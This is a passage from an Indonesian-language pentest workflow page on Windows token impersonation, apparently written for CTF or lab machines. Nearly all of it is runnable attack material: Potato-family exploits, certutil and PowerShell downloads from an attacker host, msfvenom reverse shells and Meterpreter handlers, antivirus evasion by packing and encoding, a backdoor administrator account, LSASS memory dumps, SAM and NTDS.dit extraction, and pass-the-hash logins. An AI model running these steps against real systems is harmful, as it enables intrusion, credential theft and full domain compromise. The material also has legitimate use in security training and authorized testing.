                                   └── SweetPotato
              │                     │
              └──────────┬──────────┘
                         ▼
                    VALIDATE
                         │
                         ▼
                  whoami = SYSTEM
                         │
                         ▼
                     ROOT FLAG
```

---

# [🎫 46 — Token Impersonation Workflow](/docs/token-impersonation)

# Token Impersonation — Complete Interactive Decision Workflow 🎫

> **Cara baca:** Setiap langkah punya **OUTPUT BERHASIL ✅** dan **OUTPUT GAGAL ❌**. Ikuti sesuai output yang kamu dapat.
> 
> **Prerequisite:** Sudah punya shell di Windows target (dari web exploit, SMB, WinRM, dll.)
> 
> **Tujuan:** Dari service account low-priv → `NT AUTHORITY\SYSTEM`

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Di Parrot — siapkan tools dan environment
export TARGET="10.10.11.200"
export LHOST="10.10.14.5"      # IP tun0 kamu
export LPORT="4445"
mkdir -p ~/token_loot/{tools,payloads,output}
cd ~/token_loot

echo "[*] Target: $TARGET | LHOST: $LHOST:$LPORT"

# Pastikan tools tersedia di Parrot
ls /opt/tools-windows/ | grep -E "GodPotato|PrintSpoofer|JuicyPotato|RoguePotato|SweetPotato"
```

**Tools yang harus ada di /opt/tools-windows/:**

Bash

```
# Download jika belum ada
wget https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe -P /opt/tools-windows/
wget https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe -P /opt/tools-windows/
wget https://github.com/ohpe/juicy-potato/releases/latest/download/JuicyPotato.exe -P /opt/tools-windows/
# SweetPotato & RoguePotato — download dari GitHub releases
```

---

## ═══════════════════════════════════════

## FASE 0: IDENTIFIKASI TOKEN & PRIVILEGES (LANGKAH PERTAMA)

## ═══════════════════════════════════════

> **INI YANG PALING PENTING.** Lakukan ini segera setelah dapat shell. Hasilnya menentukan seluruh arah workflow.

### Langkah 0.1 — 5 Command Wajib (Urutan Ini)

cmd

```
REM Command 1: Siapa kita?
whoami

REM Command 2: PALING PENTING — lihat semua privileges
whoami /priv

REM Command 3: Group membership (cek integrity level)
whoami /groups

REM Command 4: OS info (tentukan tool yang cocok)
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

REM Command 5: Architecture
echo %PROCESSOR_ARCHITECTURE%
```

**OUTPUT BERHASIL ✅ — Service account dengan SeImpersonate (JACKPOT!):**

text

```
C:\inetpub\wwwroot> whoami
iis apppool\defaultapppool

C:\inetpub\wwwroot> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

**Cara baca output — KEPUTUSAN LANGSUNG:**

|Privilege yang Ada|Prioritas|Ke Mana|
|---|---|---|
|`SeImpersonatePrivilege Enabled`|🔥 TERTINGGI|→ **FASE 2 (Potato Family)**|
|`SeAssignPrimaryTokenPrivilege Enabled`|🔥 TINGGI|→ **FASE 2 (Potato Family)**|
|`SeDebugPrivilege Enabled`|🔥 TINGGI|→ **FASE 4 (Debug Abuse)**|
|`SeBackupPrivilege Enabled`|🔥 TINGGI|→ **FASE 5 (SAM/NTDS Dump)**|
|`SeRestorePrivilege Enabled`|🔥 TINGGI|→ **FASE 5**|
|`SeTakeOwnershipPrivilege Enabled`|🟠 MEDIUM|→ **FASE 6 (Ownership Abuse)**|
|Semua `Disabled` atau tidak ada|Kembali|→ **File 45 (Windows PrivEsc)**|

**OUTPUT ✅ — SQL Server service account:**

text

```
NT SERVICE\MSSQLSERVER> whoami /priv
SeImpersonatePrivilege    Impersonate a client after authentication    Enabled
SeAssignPrimaryTokenPrivilege    Replace a process level token         Disabled
```

➡️ `SeImpersonatePrivilege Enabled` = **Langsung ke FASE 1 (OS Check) → FASE 2 (Potato)**

**OUTPUT PENTING ⚠️ — Privilege ADA tapi Disabled:**

text

```
SeImpersonatePrivilege    Impersonate a client after authentication    Disabled
```

➡️ **JANGAN menyerah!** `Disabled` ≠ tidak ada. Privilege ADA di token, belum aktif. Tool Potato akan mencoba menggunakannya. **Tetap lanjut ke FASE 2.**

**OUTPUT GAGAL ❌ — Tidak ada privilege menarik:**

text

```
SeChangeNotifyPrivilege    Bypass traverse checking    Enabled
SeShutdownPrivilege        Shut down the system        Disabled
```

➡️ Tidak ada privilege berbahaya. **→ Kembali ke [🪟 45 — Windows Privilege Escalation Workflow](/docs/windows-privesc)** untuk vector lain (service exploit, registry, scheduled task, dll.)

---

### Langkah 0.2 — Simpan Info Penting

cmd

```
REM Simpan semua info ke file untuk referensi
whoami /all > C:\Windows\Temp\token_info.txt
systeminfo >> C:\Windows\Temp\token_info.txt
echo "[*] Token info saved"

REM Cek konten
type C:\Windows\Temp\token_info.txt
```

cmd

```
REM Cek integrity level secara spesifik
whoami /groups | findstr /i "Mandatory Label"
```

**OUTPUT — Integrity Level:**

|Output|Artinya|
|---|---|
|`Medium Mandatory Level`|Normal user/service, belum elevated|
|`High Mandatory Level`|Sudah elevated (admin)|
|`System Mandatory Level`|Sudah SYSTEM|

➡️ `Medium` = target kita adalah mencapai `System Mandatory Level`

---

## ═══════════════════════════════════════

## FASE 1: CEK OS & PILIH TOOL YANG TEPAT

## ═══════════════════════════════════════

> **Ini menentukan Potato mana yang digunakan.** Pilihan tool salah = waste waktu.

### Langkah 1.1 — Identifikasi Windows Build

cmd

```
REM Command lengkap untuk identifikasi OS
systeminfo | findstr /i "OS Name"
systeminfo | findstr /i "OS Version"
echo %PROCESSOR_ARCHITECTURE%

REM Cara cepat — build number saja
powershell -c "(Get-CimInstance Win32_OperatingSystem).BuildNumber"
```

**OUTPUT BERHASIL ✅ — Berbagai OS:**

text

```
OS Name:    Microsoft Windows Server 2019 Standard
OS Version: 10.0.17763 N/A Build 17763
System Type: x64-based PC
```

**Tabel Pilihan Tool Berdasarkan OS:**

|OS / Build|Tool PRIORITAS|Alternatif|Notes|
|---|---|---|---|
|**Windows 10 1809+ (Build 17763+)**|**GodPotato**|PrintSpoofer|JuicyPotato TIDAK bekerja|
|**Windows Server 2019 (Build 17763)**|**GodPotato**|PrintSpoofer|JuicyPotato TIDAK bekerja|
|**Windows Server 2022**|**GodPotato**|SweetPotato|Pastikan .NET cocok|
|**Windows 10 sebelum 1809**|**PrintSpoofer**|JuicyPotato|Keduanya candidate|
|**Windows Server 2016 (Build 14393)**|**PrintSpoofer**|JuicyPotato|Keduanya viable|
|**Windows Server 2012/2012 R2**|**JuicyPotato**|PrintSpoofer|JP sangat reliable di sini|
|**Windows 7 / Server 2008 R2**|**JuicyPotato**|-|Legacy, JP adalah pilihan utama|
|**Tidak tahu / tidak yakin**|**GodPotato** → PrintSpoofer → JP|Coba urutan ini|Trial and error|

**Google search untuk OS tidak dikenal:** `"Windows Build [NUMBER] name version"` atau `"JuicyPotato compatible Windows version list"`

---

### Langkah 1.2 — Cek .NET Runtime (Untuk GodPotato)

cmd

```
REM Cek .NET yang tersedia
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP" /s /v version 2>nul

REM Cara alternatif
dir C:\Windows\Microsoft.NET\Framework\
dir C:\Windows\Microsoft.NET\Framework64\
```

**OUTPUT BERHASIL ✅:**

text

```
v4.0.30319
v3.5
v2.0.50727
```

**Pilihan GodPotato berdasarkan .NET:**

|.NET Available|Gunakan|
|---|---|
|v4.x|`GodPotato-NET4.exe` ← **Paling umum**|
|v3.5|`GodPotato-NET35.exe`|
|v2.0|`GodPotato-NET2.exe`|

➡️ **Jika tidak yakin → coba `GodPotato-NET4.exe` dulu** (paling sering berhasil)

---

## ═══════════════════════════════════════

## FASE 2: POTATO FAMILY EXPLOITATION

## ═══════════════════════════════════════

> **Masuk sini jika:** `SeImpersonatePrivilege` atau `SeAssignPrimaryTokenPrivilege` ada di token.  
> **Urutan coba:** GodPotato → PrintSpoofer → JuicyPotato → RoguePotato → SweetPotato

### Langkah 2.1 — Setup: Transfer Tools ke Target

Bash

```
# Di Parrot: jalankan HTTP server
cd /opt/tools-windows
python3 -m http.server 8080
```

cmd

```
REM Di target: download tool (coba method yang bisa)
REM Method 1: certutil (paling reliable)
certutil -urlcache -split -f http://ATTACKER_IP:8080/GodPotato-NET4.exe C:\Windows\Temp\gp.exe

REM Method 2: PowerShell IWR
powershell -c "Invoke-WebRequest -Uri 'http://ATTACKER_IP:8080/GodPotato-NET4.exe' -OutFile 'C:\Windows\Temp\gp.exe'"

REM Method 3: PowerShell WebClient
powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP:8080/GodPotato-NET4.exe','C:\Windows\Temp\gp.exe')"

REM Verifikasi download berhasil
dir C:\Windows\Temp\gp.exe
```

**OUTPUT BERHASIL ✅:**

text

```
09/01/2024  11:23 AM           421,376 gp.exe
```

**OUTPUT GAGAL ❌ — Download gagal:**

text

```
certutil: -URLCache command FAILED: 0x80070005
```

➡️ Coba path lain:

cmd

```
REM Coba path yang writable lain
certutil -urlcache -split -f http://ATTACKER_IP:8080/GodPotato-NET4.exe C:\Temp\gp.exe
certutil -urlcache -split -f http://ATTACKER_IP:8080/GodPotato-NET4.exe %APPDATA%\gp.exe
certutil -urlcache -split -f http://ATTACKER_IP:8080/GodPotato-NET4.exe %PUBLIC%\gp.exe

REM Cek directory mana yang writable
echo test > C:\Windows\Temp\test.txt && echo "[+] Windows\Temp writable"
echo test > C:\Temp\test.txt && echo "[+] C:\Temp writable"
echo test > %PUBLIC%\test.txt && echo "[+] Public writable"
```

---

### Langkah 2.2 — PATH A: GodPotato (Modern Windows — COBA INI DULU)

> Prerequisite: Windows 10 1809+ / Server 2019 / Server 2022

**STEP 1: Validasi dulu (WAJIB sebelum reverse shell)**

cmd

```
REM Test sederhana — jalankan whoami sebagai SYSTEM
C:\Windows\Temp\gp.exe -cmd "cmd /c whoami"
```

**OUTPUT BERHASIL ✅ — GodPotato works:**

text

```
[*] CombaseModule: 0x140708049272832
[*] PoC CLSID:{854A20FB-2D44-457D-992F-EF13785D2B51}
[*] CreateNamedPipe \\.\pipe\godpotato-...
[*] Trigger RPCSS success
[*] PIPE ActiveXSrv
[*] Token Impersonation success!
[*] cmd : nt authority\system
```

➡️ **BERHASIL!** Lanjut ke Step 2.

cmd

```
REM Validasi alternatif — output ke file (tidak butuh network)
C:\Windows\Temp\gp.exe -cmd "cmd /c whoami > C:\Windows\Temp\gp_test.txt"
type C:\Windows\Temp\gp_test.txt
```

**OUTPUT BERHASIL ✅:**

text

```
nt authority\system
```

**STEP 2: Buat payload reverse shell**

Bash

```
# Di Parrot: buat reverse shell executable
msfvenom -p windows/x64/shell_reverse_tcp \
    LHOST=$LHOST LPORT=$LPORT \
    -f exe -o ~/token_loot/payloads/shell.exe

# Transfer ke target (HTTP server harus masih jalan)
```

cmd

```
REM Download payload ke target
certutil -urlcache -split -f http://ATTACKER_IP:8080/shell.exe C:\Windows\Temp\shell.exe
```

**STEP 3: Setup listener & eksekusi**

Bash

```
# Di Parrot: setup listener SEBELUM eksekusi
rlwrap nc -lvnp $LPORT
```

cmd

```
REM Di target: trigger reverse shell via GodPotato
C:\Windows\Temp\gp.exe -cmd "C:\Windows\Temp\shell.exe"
```

**OUTPUT BERHASIL ✅ — Listener menerima koneksi:**

text

```
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.200] 54321
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> whoami /priv
... (semua privilege SYSTEM)
```

➡️ **SYSTEM SHELL!** → Langsung ke **FASE 7 (Post-Exploitation)**

**Cara alternatif — Tambah user admin langsung (tanpa reverse shell):**

cmd

```
REM Tambah user admin (jika outbound firewall ketat)
C:\Windows\Temp\gp.exe -cmd "cmd /c net user hacker P@ssw0rd123! /add"
C:\Windows\Temp\gp.exe -cmd "cmd /c net localgroup administrators hacker /add"

REM Verifikasi
C:\Windows\Temp\gp.exe -cmd "cmd /c net user hacker"
```

**OUTPUT BERHASIL ✅:**

text

```
nt authority\system (dari GodPotato sebelumnya)
The command completed successfully.
```

Bash

```
# Login dari Parrot dengan user baru
evil-winrm -i $TARGET -u "hacker" -p "P@ssw0rd123!"
xfreerdp /u:hacker /p:P@ssw0rd123! /v:$TARGET
```

**OUTPUT GAGAL ❌ — GodPotato tidak bekerja:**

text

```
[*] Token Impersonation failed
```

atau tidak ada output sama sekali, atau:

text

```
Unhandled Exception: System.InvalidOperationException: ...
```

➡️ Coba GodPotato dengan versi .NET berbeda:

cmd

```
REM Coba versi .NET lain
certutil -urlcache -split -f http://ATTACKER_IP:8080/GodPotato-NET35.exe C:\Windows\Temp\gp35.exe
C:\Windows\Temp\gp35.exe -cmd "cmd /c whoami"

certutil -urlcache -split -f http://ATTACKER_IP:8080/GodPotato-NET2.exe C:\Windows\Temp\gp2.exe
C:\Windows\Temp\gp2.exe -cmd "cmd /c whoami"
```

➡️ Jika semua GodPotato gagal → **Lanjut ke PATH B (PrintSpoofer)**

---

### Langkah 2.3 — PATH B: PrintSpoofer (Windows 10/Server 2016-2019)

**STEP 1: Cek Print Spooler service**

cmd

```
REM WAJIB: cek apakah Print Spooler running
sc query spooler | findstr STATE

REM Jika STOPPED, coba start
sc start spooler
```

**OUTPUT BERHASIL ✅ — Spooler running:**

text

```
STATE              : 4  RUNNING
```

**OUTPUT GAGAL ❌ — Spooler stopped dan tidak bisa di-start:**

text

```
[SC] StartService FAILED 5: Access is denied.
```

➡️ PrintSpoofer kemungkinan tidak akan bekerja. **→ Coba PATH C (JuicyPotato)**

**STEP 2: Transfer dan test PrintSpoofer**

cmd

```
certutil -urlcache -split -f http://ATTACKER_IP:8080/PrintSpoofer64.exe C:\Windows\Temp\PS.exe

REM Validasi dulu
C:\Windows\Temp\PS.exe -i -c "cmd /c whoami"
```

**OUTPUT BERHASIL ✅:**

text

```
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.2628]
C:\Windows\system32> whoami
nt authority\system
```

cmd

```
REM Eksekusi payload reverse shell
REM (Listener sudah running di Parrot: rlwrap nc -lvnp $LPORT)
C:\Windows\Temp\PS.exe -c "C:\Windows\Temp\shell.exe"
```

**Cara non-interactive (jika interactive mode tidak bisa):**

cmd

```
REM Output ke file
C:\Windows\Temp\PS.exe -c "cmd.exe /c whoami > C:\Windows\Temp\ps_test.txt"
type C:\Windows\Temp\ps_test.txt

REM Tambah user admin
C:\Windows\Temp\PS.exe -c "cmd.exe /c net user hacker P@ssw0rd123! /add && net localgroup administrators hacker /add"
```

**OUTPUT GAGAL ❌ — PrintSpoofer gagal:**

text

```
[-] CreateFile failed: 2
```

atau:

text

```
[-] ImpersonateNamedPipeClient() failed
```

➡️ Lanjut ke **PATH C (JuicyPotato)**

---

### Langkah 2.4 — PATH C: JuicyPotato (Windows Lama — sebelum 1809)

> **PENTING:** JuicyPotato TIDAK bekerja di Windows 10 Build 1809+ dan Server 2019+. Untuk OS modern, gunakan GodPotato atau PrintSpoofer.

**STEP 1: Pastikan OS compatible**

cmd

```
REM Konfirmasi OS lama
systeminfo | findstr "OS Version"
REM Build harus < 17763 untuk JuicyPotato
```

**STEP 2: Identifikasi OS untuk pilih CLSID**

cmd

```
systeminfo | findstr /i "OS Name"
```

**CLSID yang sering digunakan (contoh historis — validasi selalu dengan database):**

|OS|CLSID Contoh|
|---|---|
|Windows 7|`{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}`|
|Server 2008 R2|`{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}`|
|Windows 10 pre-1809|`{e60687f7-01a1-40aa-86ac-db1cbf673334}`|
|Server 2012|`{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}`|
|Server 2016|`{e60687f7-01a1-40aa-86ac-db1cbf673334}`|

**Google search untuk CLSID:** `"JuicyPotato CLSID Windows Server 2016"` atau lihat `https://github.com/ohpe/juicy-potato/tree/master/CLSID`

**STEP 3: Transfer dan test**

cmd

```
certutil -urlcache -split -f http://ATTACKER_IP:8080/JuicyPotato.exe C:\Windows\Temp\JP.exe

REM Test dengan output ke file (tidak butuh network)
C:\Windows\Temp\JP.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\Windows\Temp\jp_test.txt" -t * -c {CLSID_DISINI}

REM Baca hasil
type C:\Windows\Temp\jp_test.txt
```

**OUTPUT BERHASIL ✅:**

text

```
Testing {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} 1337
......
[+] authresult 0
{9B1F122C-2982-4e91-AA8B-E071D54F2A4D};NT AUTHORITY\SYSTEM
[+] CreateProcessWithTokenW OK
[+] enjoy :)
```

text

```
nt authority\system   (isi jp_test.txt)
```

cmd

```
REM Eksekusi reverse shell
REM (Listener: rlwrap nc -lvnp $LPORT di Parrot)
C:\Windows\Temp\JP.exe -l 1337 -p C:\Windows\Temp\shell.exe -t * -c {CLSID}
```

**OUTPUT GAGAL ❌ — authresult -1 atau CLSID tidak cocok:**

text

```
Testing {CLSID} 1337
......
[-] authresult -1
```

➡️ CLSID tidak cocok untuk OS ini. Coba CLSID berbeda:

cmd

```
REM Coba beberapa CLSID berbeda
REM Server 2016 alternative CLSIDs:
C:\Windows\Temp\JP.exe -l 1338 -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\Windows\Temp\jp2.txt" -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
type C:\Windows\Temp\jp2.txt

C:\Windows\Temp\JP.exe -l 1339 -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\Windows\Temp\jp3.txt" -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
type C:\Windows\Temp\jp3.txt
```

**Google search jika semua CLSID gagal:** `"JuicyPotato CLSID list [OS NAME] [BUILD NUMBER]"`

**OUTPUT GAGAL ❌ — JuicyPotato tidak work di OS modern:**

text

```
(tidak ada output / error runtime)
```

➡️ Konfirmasi OS build > 17763? JuicyPotato memang tidak bekerja. **→ Wajib pakai GodPotato atau PrintSpoofer**

---

### Langkah 2.5 — PATH D: RoguePotato (Ketika yang lain gagal)

> Lebih kompleks karena butuh socat redirect di Parrot. Gunakan sebagai fallback.

Bash

```
# Di Parrot: setup socat redirect (Terminal 1)
# $TARGET = IP victim Windows
sudo socat TCP-LISTEN:135,reuseaddr,fork TCP:$TARGET:9999

# Di Parrot: setup listener (Terminal 2)
rlwrap nc -lvnp $LPORT
```

cmd

```
REM Di target Windows: download dan jalankan
certutil -urlcache -split -f http://ATTACKER_IP:8080/RoguePotato.exe C:\Windows\Temp\RP.exe

REM Eksekusi
C:\Windows\Temp\RP.exe -r ATTACKER_IP -e "C:\Windows\Temp\shell.exe" -l 9999
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Listening for connections...
[*] Pipe connected!
[*] Impersonating NT AUTHORITY\SYSTEM
[*] CreateProcessAsUser: OK
```

**OUTPUT GAGAL ❌ — Timeout atau RPC error:**

text

```
[*] ERROR: Cannot connect to 135
```

➡️ Firewall mungkin blokir port 135/9999. Coba port berbeda:

Bash

```
# Coba port 80 atau 443 (lebih mungkin diizinkan)
sudo socat TCP-LISTEN:80,reuseaddr,fork TCP:$TARGET:9999
```

**Google search:** `"RoguePotato failed RPC error socat"` atau `"RoguePotato port 135 alternative"`

---

### Langkah 2.6 — PATH E: SweetPotato (Multi-Technique)

cmd

```
certutil -urlcache -split -f http://ATTACKER_IP:8080/SweetPotato.exe C:\Windows\Temp\SP.exe

REM Test dengan EfsRpc technique
C:\Windows\Temp\SP.exe -e EfsRpc -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\Windows\Temp\sp_test.txt"
type C:\Windows\Temp\sp_test.txt

REM Test dengan technique berbeda jika EfsRpc gagal
C:\Windows\Temp\SP.exe -e PrintSpoofer -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\Windows\Temp\sp_test2.txt"
```

**OUTPUT BERHASIL ✅:**

text

```
nt authority\system
```

cmd

```
REM Eksekusi payload
C:\Windows\Temp\SP.exe -e EfsRpc -p C:\Windows\Temp\shell.exe
```

---

### Langkah 2.7 — SEMUA POTATO GAGAL? Diagnosis

cmd

```
REM Cek apakah SeImpersonatePrivilege benar-benar ada
whoami /priv | findstr /i "SeImpersonate"

REM Cek apakah AV menghapus tools
dir C:\Windows\Temp\*.exe

REM Cek apakah outbound blocked
powershell -c "Test-NetConnection ATTACKER_IP -Port 4445"
```

**Jika AV menghapus tools:**

Bash

```
# Di Parrot: obfuscate binary dengan upx atau msfvenom encoding
upx --best /opt/tools-windows/GodPotato-NET4.exe -o /opt/tools-windows/gp_packed.exe

# Atau: buat payload sendiri yang sudah encoded
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT \
    -f exe -e x64/xor_dynamic --iterations 3 -o ~/token_loot/payloads/shell_enc.exe
```

**Jika semua Potato benar-benar gagal:**

text

```
→ Kembali ke <a href="/docs/windows-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">45_windows_privesc_workflow.md</a>
→ Coba vector lain: AlwaysInstallElevated, Service exploit, Scheduled Task, dll.
```

---

## ═══════════════════════════════════════

## FASE 3: METERPRETER INCOGNITO (Jika sudah punya Meterpreter)

## ═══════════════════════════════════════

> **Berbeda dari Potato!** Incognito enumerate dan gunakan token yang SUDAH ADA, bukan membuat yang baru.

### Langkah 3.1 — Setup Meterpreter Session

Bash

```
# Di Parrot: buat Meterpreter payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=$LHOST LPORT=4444 \
    -f exe -o ~/token_loot/payloads/meter.exe

# Setup handler
msfconsole -q -x "
use exploit/multi/handler;
set payload windows/x64/meterpreter/reverse_tcp;
set LHOST $LHOST;
set LPORT 4444;
run
"
```

cmd

```
REM Di target: transfer dan jalankan
certutil -urlcache -split -f http://ATTACKER_IP:8080/meter.exe C:\Windows\Temp\meter.exe
C:\Windows\Temp\meter.exe
```

---

### Langkah 3.2 — Enumerate Tokens dengan Incognito

text

```
meterpreter > load incognito
[+] Incognito extension loaded.

meterpreter > list_tokens -u
```

**OUTPUT BERHASIL ✅ — Ada SYSTEM token:**

text

```
Delegation Tokens Available
========================================
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM          ← INI YANG KITA MAU!

Impersonation Tokens Available
========================================
VICTIM\alice
NT AUTHORITY\ANONYMOUS LOGON
```

text

```
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

➡️ **BERHASIL!** Spawn shell:

text

```
meterpreter > shell

C:\Windows\system32> whoami
nt authority\system
```

**OUTPUT GAGAL ❌ — SYSTEM token tidak ada:**

text

```
Delegation Tokens Available
========================================
NT AUTHORITY\LOCAL SERVICE

Impersonation Tokens Available
========================================
NT AUTHORITY\ANONYMOUS LOGON
```

➡️ SYSTEM token belum tersedia (belum ada SYSTEM process yang pernah interaksi). Gunakan `getsystem` atau Potato family:

text

```
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin))

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**OUTPUT GAGAL ❌ — getsystem juga gagal:**

text

```
[-] priv_elevate_getsystem: Operation failed: Access is denied.
```

➡️ Kembali ke Potato family manual (FASE 2) atau vector lain.

---

## ═══════════════════════════════════════

## FASE 4: SEDEBUGPRIVILEGE ABUSE

## ═══════════════════════════════════════

> **Masuk sini jika:** `SeDebugPrivilege Enabled` di whoami /priv.  
> **Berguna untuk:** LSASS dump → credential extraction.

### Langkah 4.1 — Konfirmasi dan Eksploitasi

cmd

```
REM Konfirmasi privilege
whoami /priv | findstr /i "SeDebugPrivilege"
```

**OUTPUT BERHASIL ✅:**

text

```
SeDebugPrivilege    Debug programs    Enabled
```

**Method 1: Dump LSASS untuk credentials**

cmd

```
REM Method 1: ProcDump (perlu download)
certutil -urlcache -split -f http://ATTACKER_IP:8080/procdump.exe C:\Windows\Temp\pd.exe
C:\Windows\Temp\pd.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp

REM Method 2: Task Manager (jika ada GUI via RDP)
REM Buka Task Manager → Details → lsass.exe → Create dump file

REM Method 3: Comsvcs (native Windows, tidak perlu upload)
powershell -c "
\$lsass = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump \$lsass C:\Windows\Temp\lsass.dmp full
"

REM Verifikasi dump terbuat
dir C:\Windows\Temp\lsass.dmp
```

**OUTPUT BERHASIL ✅ — Dump berhasil:**

text

```
09/01/2024  12:00 PM        52,428,800 lsass.dmp
```

**Method 2: psgetsys.ps1 untuk process impersonation**

cmd

```
REM Download psgetsys.ps1
certutil -urlcache -split -f http://ATTACKER_IP:8080/psgetsys.ps1 C:\Windows\Temp\pgs.ps1

REM Cari PID dari process SYSTEM
powershell -c "Get-Process | Where-Object {$_.Name -eq 'winlogon'} | Select-Object Id"
```

**OUTPUT:**

text

```
Id
--
688
```

cmd

```
REM Jalankan command sebagai SYSTEM via parent PID injection
powershell -ep bypass -c "
. C:\Windows\Temp\pgs.ps1;
ImpersonateFromParentPid -ppid 688 -command 'C:\Windows\Temp\shell.exe' -cmdargs ''
"
```

**OUTPUT BERHASIL ✅:**

➡️ Shell diterima di listener sebagai `nt authority\system`

**Transfer dan analisis dump:**

Bash

```
# Di Parrot: download dump (via SMB atau reverse shell)
# Cara 1: Analisis dengan pypykatz
pip3 install pypykatz
pypykatz lsa minidump lsass.dmp

# Cara 2: Analisis dengan impacket
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

**OUTPUT BERHASIL ✅ — Credentials ditemukan:**

text

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971881:::
...
[WDIGEST]
Username: Administrator
Password: P@ssw0rd2024!
```

➡️ Simpan credentials → test ke semua service (SMB, WinRM, RDP) → lateral movement!

---

## ═══════════════════════════════════════

## FASE 5: SEBACKUPPRIVILEGE / SERESTOREPRIVILEGE

## ═══════════════════════════════════════

> **Masuk sini jika:** `SeBackupPrivilege` atau `SeRestorePrivilege` ada.  
> **Target:** Dump SAM/SYSTEM/SECURITY hives → crack hash offline.

### Langkah 5.1 — Local SAM Dump (Standard Machine)

cmd

```
REM Konfirmasi privilege
whoami /priv | findstr /i "SeBackupPrivilege"

REM Dump registry hives
reg save HKLM\SAM C:\Windows\Temp\SAM.hive /y
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive /y
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY.hive /y

REM Verifikasi
dir C:\Windows\Temp\*.hive
```

**OUTPUT BERHASIL ✅:**

text

```
09/01/2024  12:30 PM            45,056 SAM.hive
09/01/2024  12:30 PM        16,777,216 SYSTEM.hive
09/01/2024  12:30 PM            32,768 SECURITY.hive
```

**Transfer ke Parrot dan analisis:**

Bash

```
# Transfer files (gunakan download dari reverse shell atau SMB)
# Di Parrot: analisis
impacket-secretsdump -sam SAM.hive -system SYSTEM.hive -security SECURITY.hive LOCAL
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Target system bootKey: 0x4a3d87f...
[*] Dumping local SAM hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971881:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
webuser:1001:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
```

➡️ Crack hash offline atau gunakan Pass-the-Hash:

Bash

```
# Crack NTLM hash
hashcat -m 1000 "fc525c9683e8fe067095ba2ddc971881" /usr/share/wordlists/rockyou.txt

# Pass-the-Hash langsung
nxc smb $TARGET -u Administrator -H "fc525c9683e8fe067095ba2ddc971881"
evil-winrm -i $TARGET -u Administrator -H "fc525c9683e8fe067095ba2ddc971881"
impacket-psexec "Administrator@$TARGET" -hashes "aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971881"
```

---

### Langkah 5.2 — Domain Controller: NTDS.dit Dump

> Gunakan ini hanya jika target adalah **Domain Controller!**

cmd

```
REM Konfirmasi ini adalah DC
net group "Domain Controllers" /domain

REM Method: DiskShadow + robocopy + SeBackupPrivilege
REM Step 1: Buat shadow copy script
powershell -c "
@'
set context persistent nowriters
add volume c: alias sysvol
create
expose %sysvol% x:
'@ | Out-File C:\Windows\Temp\shadow.txt -Encoding ascii
"

REM Step 2: Eksekusi shadow copy
diskshadow /s C:\Windows\Temp\shadow.txt

REM Step 3: Copy NTDS.dit via backup semantics
robocopy /b X:\Windows\NTDS C:\Windows\Temp NTDS.dit

REM Step 4: Save SYSTEM hive
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive /y

REM Verifikasi
dir C:\Windows\Temp\NTDS.dit
```

**OUTPUT BERHASIL ✅:**

text

```
09/01/2024  01:00 PM        24,117,248 NTDS.dit
09/01/2024  01:00 PM        16,777,216 SYSTEM.hive
```

Bash

```
# Di Parrot: extract semua domain hashes
impacket-secretsdump -ntds NTDS.dit -system SYSTEM.hive LOCAL

# OUTPUT:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:NTHASH:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:NTHASH:::
# CORP.LOCAL\user1:1104:aad3b435b51404eeaad3b435b51404ee:NTHASH:::
# (semua domain user hashes!)
```

